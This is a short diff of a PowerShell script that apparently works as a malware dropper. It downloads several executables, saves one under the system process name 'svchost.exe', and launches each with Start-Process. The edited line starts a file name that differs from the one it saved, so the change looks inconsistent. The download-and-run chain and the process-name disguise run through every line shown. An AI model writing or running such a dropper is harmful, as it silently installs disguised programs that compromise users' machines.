@@ -24,4 +24,4 @@ function DL($file, $out) {
 
 DL "system.exe" "$d\svchost.exe"; Start-Sleep 3; Start-Process "$d\svchost.exe"
 DL "usc.exe" "$d\usc.exe"; Start-Sleep 3; Start-Process "$d\usc.exe"
-DL "agent1.exe" "$d\abg.exe"; Start-Sleep 3; Start-Process "$d\abg.exe"
+DL "agent1.exe" "$d\abg.exe"; Start-Sleep 3; Start-Process "$d\agent1.exe"
